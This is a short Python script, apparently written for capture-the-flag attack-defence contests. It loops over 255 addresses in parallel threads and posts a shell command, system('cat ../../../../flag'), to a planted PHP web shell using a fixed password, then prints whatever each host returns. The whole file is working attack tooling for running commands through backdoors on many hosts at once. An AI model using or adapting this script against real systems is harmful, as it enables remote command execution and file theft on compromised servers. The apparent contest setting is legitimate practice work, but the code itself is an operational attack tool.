'''
Description: 
Version: 2.0
Autor: mukeers
Date: 2021-05-24 14:04:43
LastEditors: mukeers
LastEditTime: 2021-05-27 10:38:42
'''

import queue
import requests
import threading,time
import sys

q = queue.Queue()
def main(x):
    url = 'http://127.0.0.{}'.format(x) # IP
    shell = '/include/shell.php'    # 木马路径

    passwd = 'admin_ccmd'   # 连接密码

    payload={
        passwd:'system(\'cat ../../../../flag\');'
        # 目标flag路径
    }
    port = '10086' # 端口
    url1 = url+':'+port+shell # 拼接
    # 其他拼接方式
    # url1 = url+'.'+"abc.efg.com" 

    q.put(url1,block=True, timeout=None)
    try:
        response = requests.post(url1,payload,timeout=5)
        if response:
            print(response.text,url1)
    except:
        print(url1)
    if x > 255:
        print("end")
    q.task_done()

#线程队列
th=[]
th_num=255
for x in range(th_num):
    t=threading.Thread(target=main,args=(x,))
    th.append(t)
for x in range(th_num):
    th[x].start()
for x in range(th_num):
    th[x].join()
